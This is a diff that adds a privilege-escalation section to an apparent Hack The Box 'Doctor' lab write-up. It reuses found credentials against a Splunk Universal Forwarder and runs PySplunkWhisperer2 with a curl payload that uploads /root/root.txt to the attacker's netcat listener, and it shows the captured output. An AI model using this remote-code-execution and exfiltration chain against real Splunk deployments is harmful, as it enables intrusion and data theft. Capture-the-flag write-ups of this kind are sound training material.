@@ -218,8 +218,70 @@ shaun@doctor:/home$ cat /home/shaun/user.txt
 cat /home/shaun/user.txt
 <Redacted user flag>
 ```
+
+### Privilege Escalation to root
+
+With the user shaun, we realized that we are unable to execute sudo commands as shaun is not in the list of sudoers
+
+```
+shaun@doctor:~$ sudo -l
+[sudo] password for shaun: 
+Sorry, user shaun may not run sudo on doctor.
+shaun@doctor:~$ 
+```
+
+Using Linpeas and LinEnum script, we are als unable to find any useful information :(
+
+However, we realize that we have not accessed http://doctor.htb:8089. Accessing this http://doctor.htb, we are able to know that we are using splunk build 8.0.5, and accessing the /services endpoint, we also realize that we would require the correct credentials to login.
+
+![Splunk login](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/splunk_endpoint.png)
+
+Let's try to login with the credentials shaun:Guitar123 that we have found earlier. Surprisingly, we are able to login with the credentials and we are greeted with 
+With some googling, we manage to find this [site](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/), which explains that the port 8089 that we are looking at belongs to Splunk Universal Forwarder Agent which could be exploited. 
+
 ### Obtaining root flag
 
+To obtain the root flag, we will open up a reverse shell on port 4444. Using the script from [PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2), we will execute the script on our local terminal.
+
+```
+┌──(HTB)─(kali㉿kali)-[~/Desktop/SplunkWhisperer2/PySplunkWhisperer2]
+└─$ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password "Guitar123" --payload "curl -F 'data=@/root/root.txt' http://10.10.16.5:4444" --lhost 10.10.16.5
+Running in remote mode (Remote Code Execution)
+[.] Authenticating...
+[+] Authenticated
+[.] Creating malicious app bundle...
+[+] Created malicious app bundle in: /tmp/tmpckxjyyye.tar
+[+] Started HTTP server for remote mode
+[.] Installing app from: http://10.10.16.5:8181/
+10.10.10.209 - - [13/Nov/2021 23:03:24] "GET / HTTP/1.1" 200 -
+[+] App installed, your code should be running now!
+
+Press RETURN to cleanup
+```
+
+On our reverse shell at port 4444, we will be able to obtain our root flag.
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nc -nlvp 4444           
+listening on [any] 4444 ...
+connect to [10.10.16.5] from (UNKNOWN) [10.10.10.209] 42612
+POST / HTTP/1.1
+Host: 10.10.16.5:4444
+User-Agent: curl/7.68.0
+Accept: */*
+Content-Length: 219
+Content-Type: multipart/form-data; boundary=------------------------a064bc71a3674b71
+
+--------------------------a064bc71a3674b71
+Content-Disposition: form-data; name="data"; filename="root.txt"
+Content-Type: text/plain
+
+<Redacted flag>
+
+--------------------------a064bc71a3674b71--
+
+```
 ## Post-Exploitation
 ### SSTI
 
@@ -235,3 +297,4 @@ web@doctor:~/blog$ ls
 ls
 flaskblog  run.py
 ```
+### Splunk Universal Forwarder Agent Exploit
